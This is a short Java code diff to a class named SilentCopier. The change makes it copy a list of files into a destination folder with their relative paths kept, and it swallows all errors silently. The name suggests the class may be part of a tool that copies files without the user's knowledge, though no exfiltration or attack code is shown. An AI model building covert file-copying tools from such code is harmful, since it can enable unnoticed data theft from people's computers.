@@ -35,7 +35,8 @@ public class SilentCopier implements Runnable {
 	private void transferAllTheFiles() {
 		for (String nowFilePath : filesHaveToTransfer) {
 			try {
-				ComputerManager.copyFileUsingFileStreams(nowFilePath, fileWhereToSave);
+				ComputerManager.copyFileUsingFileStreams(nowFilePath,
+						fileWhereToSave + "/" + nowFilePath.substring(3, nowFilePath.length()));
 			} catch (Exception e) {
 				// TODO: handle exception
 			}
